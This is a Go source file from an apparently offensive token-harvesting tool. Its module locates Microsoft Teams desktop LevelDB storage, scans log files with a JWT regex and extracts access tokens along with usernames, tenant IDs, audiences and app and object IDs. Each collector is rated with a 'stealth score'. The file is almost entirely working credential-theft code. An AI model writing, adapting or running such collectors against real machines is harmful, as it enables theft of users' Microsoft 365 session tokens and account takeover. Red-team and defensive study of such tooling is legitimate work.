package microsoft

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
	"github.com/ninken/ninloader-go/internal/validator"
)

func init() {
	registry.Register("microsoft", "teams_desktop", func() collector.Collector {
		return &TeamsDesktopCollector{BaseCollector: collector.BaseCollector{Svc: "microsoft", Src: "teams_desktop"}}
	})
}

// TeamsDesktopCollector scans Teams LevelDB logs for JWT tokens.
type TeamsDesktopCollector struct {
	collector.BaseCollector
}

func (c *TeamsDesktopCollector) Service() string          { return c.Svc }
func (c *TeamsDesktopCollector) Source() string            { return c.Src }
func (c *TeamsDesktopCollector) StealthScore() int         { return 5 }
func (c *TeamsDesktopCollector) Platforms() []string       { return nil }
func (c *TeamsDesktopCollector) IsPlatformSupported() bool { return true }

var jwtPattern = regexp.MustCompile(`eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*`)

// findStorageDirs returns Teams Local Storage LevelDB directories.
func (c *TeamsDesktopCollector) findStorageDirs() []string {
	var dirs []string
	base := platform.TeamsDataDir()

	// Classic Teams
	lsDir := filepath.Join(base, "Local Storage", "leveldb")
	if info, err := os.Stat(lsDir); err == nil && info.IsDir() {
		dirs = append(dirs, lsDir)
	}

	// New Teams (Teams 2.0) — MSTeams / Microsoft Teams variant dirs
	parentDir := filepath.Dir(base)
	for _, variant := range []string{"MSTeams", "Microsoft Teams"} {
		newDir := filepath.Join(parentDir, variant, "Local Storage", "leveldb")
		if info, err := os.Stat(newDir); err == nil && info.IsDir() {
			dirs = append(dirs, newDir)
		}
	}

	return dirs
}

func (c *TeamsDesktopCollector) Discover() []*types.DiscoveredToken {
	var results []*types.DiscoveredToken

	for _, lsDir := range c.findStorageDirs() {
		entries, err := os.ReadDir(lsDir)
		if err != nil {
			c.Warn(fmt.Sprintf("Failed to read directory %s: %v", lsDir, err))
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".log") {
				continue
			}

			raw, err := os.ReadFile(filepath.Join(lsDir, entry.Name()))
			if err != nil {
				continue
			}

			text := toUTF8Safe(raw)
			if strings.Contains(text, "accessToken") || strings.Contains(text, "skypeToken") {
				results = append(results, &types.DiscoveredToken{
					Service:      c.Svc,
					Source:       c.Src,
					Path:         lsDir,
					StealthScore: c.StealthScore(),
					Details:      "Teams desktop token cache found",
				})
				break // one discovery per storage dir
			}
		}
	}

	return results
}

func (c *TeamsDesktopCollector) Collect() []*types.CollectedToken {
	var results []*types.CollectedToken

	for _, lsDir := range c.findStorageDirs() {
		entries, err := os.ReadDir(lsDir)
		if err != nil {
			c.Warn(fmt.Sprintf("Failed to read directory %s: %v", lsDir, err))
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".log") {
				continue
			}

			logPath := filepath.Join(lsDir, entry.Name())
			raw, err := os.ReadFile(logPath)
			if err != nil {
				continue
			}

			text := toUTF8Safe(raw)

			for _, match := range jwtPattern.FindAllString(text, -1) {
				payload := validator.DecodeJWTPayload(match)
				if payload == nil {
					continue
				}

				// Must be a Microsoft token — needs tid or aud claim
				_, hasTid := payload["tid"]
				_, hasAud := payload["aud"]
				if !hasTid && !hasAud {
					continue
				}

				tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())

				// Username from upn or preferred_username
				if upn, ok := payload["upn"].(string); ok {
					tok.Username = upn
				} else if pref, ok := payload["preferred_username"].(string); ok {
					tok.Username = pref
				}

				// Tenant ID
				if tid, ok := payload["tid"].(string); ok {
					tok.TenantID = tid
				}

				tok.AccessToken = types.Secure(match)

				// Scopes from aud
				if aud, ok := payload["aud"].(string); ok && aud != "" {
					tok.Scopes = []string{aud}
				}

				// Extra metadata
				if appid, ok := payload["appid"].(string); ok {
					tok.Extra["app_id"] = appid
				}
				if oid, ok := payload["oid"].(string); ok {
					tok.Extra["oid"] = oid
				}
				tok.Extra["source_file"] = logPath

				results = append(results, tok)
			}
		}
	}

	return results
}

// toUTF8Safe replaces invalid UTF-8 bytes with the Unicode replacement character.
func toUTF8Safe(data []byte) string {
	return strings.ToValidUTF8(string(data), "\uFFFD")
}
